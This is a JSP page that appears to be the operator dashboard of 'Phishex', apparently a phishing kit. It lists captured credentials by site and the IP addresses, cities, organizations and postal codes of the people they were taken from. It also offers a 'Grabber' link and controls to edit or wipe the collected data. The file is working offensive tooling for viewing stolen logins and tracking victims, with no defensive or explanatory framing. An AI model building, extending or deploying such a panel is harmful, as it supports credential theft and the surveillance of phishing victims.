<%@ page import="java.util.Scanner" %>
<%@ page import="java.util.concurrent.TimeUnit" %>
<%@ page import="com.phishex.dao.CredentialsDao" %>
<%@ page import="com.phishex.dao.SysInfoDao" %>
<%@ page import="com.phishex.entity.Credentials" %>
<%@ page import="java.util.List" %>
<%@ page import="com.phishex.entity.SysInfo" %><%--
  Created by IntelliJ IDEA.
  User: xuser
  Date: 4/15/20
  Time: 12:24 PM
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html; charset=UTF-8" %>
<%@ taglib uri = "http://java.sun.com/jsp/jstl/core" prefix = "c" %>
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <title>
        Dashboard
    </title>
    <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no' name='viewport' />
    <!-- CSS Files -->
    <link href="css/bootstrap.min.css" rel="stylesheet" />
    <link href="css/now-ui-dashboard.css?v=1.5.0" rel="stylesheet" />
    <link rel="stylesheet" href="css/jquery-jvectormap-2.0.5.css" type="text/css" media="screen"/>
    <script src="js/jquery.js"></script>
    <script src="js/jquery-jvectormap-2.0.5.min.js"></script>
    <script src="js/jquery-jvectormap-world-mill.js"></script>
</head>

<body class="">
<div class="wrapper ">
    <div class="sidebar" data-color="orange">
        <div class="logo">
        <span class="simple-text logo-normal">
            Phishex
        </span>
        </div>
        <div class="sidebar-wrapper" id="sidebar-wrapper">
            <ul class="nav">
                <li class="active ">
                    <a href="#">
                        <i class="now-ui-icons"></i>
                        <p>Dashboard</p>
                    </a>
                </li>
                <li>
                    <a href="${pageContext.request.contextPath}/">
                        <i class="now-ui-icons"></i>
                        <p>Grabber</p>
                    </a>
                </li>

            </ul>
        </div>
    </div>
    <div class="main-panel" id="main-panel">
        <div class="panel-header">
        </div>
        <div class="content">
            <c:set var="credsError" scope="page" value="${credsError}"/>
            <c:set var="sysInfoError" scope="page" value="${sysInfoError}"/>
            <c:set var="error" scope="page" value="${error}"/>
            <div class="row fadeIn first">
                <div class="col-md-12">
                    <div class="card card-chart">
                        <div class="card-header">
                            <h4 class="card-title"> Requests</h4>
                            <c:if test="${error != null}">
                                <h6 class="text-danger font-weight-normal">${error}</h6>
                            </c:if>
                            <div class="dropdown">
                                <button type="button" class="btn btn-round btn-outline-default" onClick="refreshPage()">
                                    Refresh
                                </button>
                                <button type="button" class="btn btn-round btn-outline-default dropdown-toggle btn-simple btn-icon no-caret" data-toggle="dropdown">
                                    <img src="<c:url value="/resources/images/adjust.png"/>" width="18" height="18">
                                </button>
                                <div class="dropdown-menu dropdown-menu-right">
                                    <a class="dropdown-item" href="/edit">Edit data</a>
                                    <a class="dropdown-item text-danger" href="/wipe">Wipe all data</a>
                                </div>
                            </div>
                        </div>
                        <div class="card-body">
                            <div class="table-responsive">
                                <table class="table">
                                    <thead class=" text-primary">
                                    <th class="col-md-1">
                                        Site
                                    </th>
                                    <th class="col-md-11">
                                        Data
                                    </th>
                                    </thead>
                                    <tbody>
                                    <c:if test="${credsError != null}">
                                        <tr>
                                            <td>
                                                <span class="text-danger">${credsError}</span>
                                            </td>
                                        </tr>
                                    </c:if>
                                    <c:if test="${credsError == null}">
                                        <c:forEach items="${credentials}" var="creds">
                                            <tr>
                                                <td class="col-md-1 text-success font-weight-normal">
                                                    ${creds.getSite().split("/")[0]}
                                                </td>
                                                <td class="col-md-11">
                                                    ${creds.getData()}
                                                </td>
                                            </tr>
                                        </c:forEach>
                                    </c:if>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="row fadeIn second">
                <div class="col-md-12">
                    <div class="card">
                        <div class="card-header">
                            <h4 class="card-title"> IP info</h4>
                        </div>
                        <div class="card-body">
                            <div class="table-responsive">
                                <table class="table">
                                    <thead class=" text-primary">
                                    <th class="col-md-2">
                                        IP
                                    </th>
                                    <th class="col-md-2">
                                        Country
                                    </th>
                                    <th class="col-md-2">
                                        City
                                    </th>
                                    <th class="col-md-2">
                                        Org.
                                    </th>
                                    <th class="col-md-2">
                                        Postal
                                    </th>
                                    <th class="col-md-2">
                                        Timezone
                                    </th>
                                    </thead>
                                    <tbody>
                                    <c:if test="${sysInfoError != null}">
                                        <tr>
                                            <td>
                                                <span class="text-danger">${sysInfoError}</span>
                                            </td>
                                        </tr>
                                    </c:if>
                                    <c:if test="${sysInfoError == null}">
                                        <c:forEach items="${sysInfo}" var="sysinfo">
                                        <tr>
                                            <td class="col-md-2">
                                                ${sysinfo.getIp()}
                                            </td>
                                            <td class="col-md-2">
                                                ${sysinfo.getCountry()}
                                            </td>
                                            <td class="col-md-2">
                                                ${sysinfo.getCity()}
                                            </td>
                                            <td class="col-md-2">
                                                ${sysinfo.getOrganization()}
                                            </td>
                                            <td class="col-md-2">
                                                ${sysinfo.getPostal()}
                                            </td>
                                            <td class="col-md-2">
                                                ${sysinfo.getTimezone()}
                                            </td>
                                        </tr>
                                    </c:forEach>
                                    </c:if>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <%--<div class="row fadeIn third">
                <div class="col-md-12">
                    <div id="world-map-markers" style="width: 800px; height: 500px;"></div>
                    <script>
                        $(function(){
                            $('#world-map').vectorMap({map: 'world_mill'});
                        });
                        // $(function(){
                        //     $('#world-map-markers').vectorMap({
                        //         map: 'world_mill',
                        //         scaleColors: ['#C8EEFF', '#0071A4'],
                        //         normalizeFunction: 'polynomial',
                        //         hoverOpacity: 0.7,
                        //         hoverColor: false,
                        //         markerStyle: {
                        //             initial: {
                        //                 fill: '#F8E23B',
                        //                 stroke: '#383f47'
                        //             }
                        //         },
                        //         backgroundColor: '#383f47',
                        //         markers: [
                        //             {latLng: [41.90, 12.45], name: 'Vatican City'}
                        //         ]
                        //     });
                        // });
                    </script>
                </div>
            </div>--%>
        </div>
    </div>
</div>
<script>
    function refreshPage(){
        window.location.reload();
    }
</script>
<!--   Core JS Files   -->
<script src="js/core/jquery.min.js"></script>
<script src="js/core/popper.min.js"></script>
<script src="js/core/bootstrap.min.js"></script>
<script src="js/plugins/perfect-scrollbar.jquery.min.js"></script>
<!-- Chart JS -->
<script src="js/plugins/chartjs.min.js"></script>
<!-- Control Center for Now Ui Dashboard: parallax effects, scripts for the example pages etc -->
<script src="js/now-ui-dashboard.min.js?v=1.5.0" type="text/javascript"></script><!-- Now Ui Dashboard DEMO methods, don't include it in your project! -->
<script src="js/demo/demo.js"></script>
<script>
    $(document).ready(function() {
        demo.initDashboardPageCharts();

    });
</script>
</body>

</html>

